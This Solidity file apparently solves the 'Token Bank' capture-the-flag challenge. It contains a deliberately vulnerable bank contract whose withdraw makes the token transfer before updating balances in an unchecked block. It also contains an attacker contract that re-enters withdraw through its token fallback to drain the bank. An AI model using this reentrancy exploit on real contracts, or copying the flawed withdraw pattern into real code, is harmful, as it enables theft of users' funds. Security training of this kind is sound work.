// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

contract SimpleERC223Token {
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";

    string public symbol = "SET";

    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        balanceOf[msg.sender] = totalSupply;

        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;

        assembly {
            length := extcodesize(_addr)
        }

        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;

        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes memory data) public returns (bool) {
        console.log("transfer entered");

        console.log("transfer msg.sender:", msg.sender);

        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;

        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }

        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);

        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);

        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;

        balanceOf[to] += value;

        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);

        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;

    mapping(address => uint256) public balanceOf;

    address public player;

    constructor(address _player) public {
        token = new SimpleERC223Token();

        player = _player;

        balanceOf[msg.sender] = 500_000 * 10 ** 18;

        balanceOf[player] = 500_000 * 10 ** 18;
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        console.log("fb-on-challenge");

        require(msg.sender == address(token));

        //who is from if withdrawer is player

        // from is challenge contract

        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        console.log("withdraw entered");

        console.log("withdraw msg.sender:", msg.sender);

        //what if I withdraw 0

        console.log("balanceOf[msg.sender]:", balanceOf[msg.sender]);

        console.log("amount:", amount);

        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));

        console.log("transfer passed");

        //the internal accounting for player is the last thing to happen

        unchecked {
            console.log("to update balanceOf[msg.sender]");

            console.log("before :", balanceOf[msg.sender]);

            balanceOf[msg.sender] -= amount;

            console.log("after:", balanceOf[msg.sender]);

            console.log("update balanceOf[msg.sender]");
        }
    }
}

contract TokenBankAttacker is ITokenReceiver {
    TokenBankChallenge public challenge;

    address public token;

    address player = address(1234);

    uint256 counter;

    mapping(address => uint256) balanceOf;

    constructor(address challengeAddress) {
        challenge = TokenBankChallenge(challengeAddress);
    }

    function setToken(address _token) public {
        console.log("Set Token...");

        token = _token;
    }

    function depositIntoBank(address to, uint256 amount) public {
        console.log("deposit into bank");

        SimpleERC223Token(token).transfer(to, amount);
    }

    function attack(uint256 amount) public {
        console.log("Attacking");

        challenge.withdraw(amount);
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        console.log("fb-on-attacker");

        counter++;

        if (counter == 1) {
            console.log("First Attacker Fallback, Do Nothing");
        } else {
            if (counter == 2) {
                console.log("Second Attacker FallBack");

                console.log("Withdrawing 1 more time...");

                challenge.withdraw(value);
            }
        }

        if (counter == 3) {
            console.log("end of attack");
        }
    }
}
